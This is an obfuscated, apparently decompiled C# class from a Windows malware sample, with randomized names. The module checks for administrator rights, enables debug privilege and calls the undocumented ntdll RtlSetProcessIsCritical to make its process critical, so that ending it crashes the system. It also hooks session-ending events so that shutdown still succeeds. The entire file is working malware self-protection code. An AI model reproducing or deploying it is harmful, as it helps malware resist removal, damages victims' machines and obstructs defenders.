using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;

namespace tmhhYTpfSQZiU;

public static class kJonFWMnLmo
{
	public static bool YIHfjIOLEUmn()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void soYVAGRTzyvl(object sender, SessionEndingEventArgs e)
	{
		if (YIHfjIOLEUmn())
		{
			UfmSZorRsAXXy();
		}
	}

	public static void oHBUGntyCoVr()
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		try
		{
			SystemEvents.add_SessionEnding(new SessionEndingEventHandler(soYVAGRTzyvl));
			Process.EnterDebugMode();
			RtlSetProcessIsCritical(1u, 0u, 0u);
		}
		catch
		{
		}
	}

	public static void UfmSZorRsAXXy()
	{
		try
		{
			RtlSetProcessIsCritical(0u, 0u, 0u);
		}
		catch
		{
			while (true)
			{
				Thread.Sleep(100000);
			}
		}
	}

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern void RtlSetProcessIsCritical(uint uint_0, uint uint_1, uint uint_2);
}
